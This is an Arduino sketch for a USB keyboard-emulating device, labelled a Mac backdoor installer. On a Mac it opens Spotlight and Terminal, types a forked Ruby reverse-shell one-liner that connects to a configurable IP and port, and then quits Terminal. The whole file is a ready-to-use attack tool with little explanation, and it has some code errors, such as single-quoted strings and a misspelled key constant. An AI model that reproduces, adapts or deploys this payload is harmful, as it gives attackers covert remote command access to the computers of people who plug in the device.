/* mac-backdoor.ino
 * Automated backdoor installation.
 * Set a few variables and you're off to the races!
 * Defaults to a reverse shell.
 */

// Constants
const int led = 13;
const int ds = 1000;
const String ip = '127.0.0.1';
const String port = '';

void setup() {
  delay(ds); // Give the computer a second to connect
  pinMode(led, OUTPUT); // Status light on!

  spotlight("Terminal");
  typeln("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+ip+"\",\""+port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'");
  cmd(KEY_Q);
}

void loop() {
  // Blink a lot - we're done!
  digitalWrite(led, HIGH);
  delay(ds);
  digitalWrite(led, LOW);
  delay(ds);
}

// Keyboard functions

void mod(int mod, int key) {
  Keyboard.press(mod);
  Keyboard.press(key);
  Keyboard.releaseAll();
  delay(ds);
}

void typeln(String cmd) {
  Keyboard.print(cmd);
  delay(ds);
  Keyboard.println("");
  delay(ds*2);
}


// Mac-specific functions

void spotlight(String application) {
  cmd(KEY_SPACE);
  typeln(application);
}

void cmd(int key) {
  mod(MODIFERKEY_GUI, key);
}
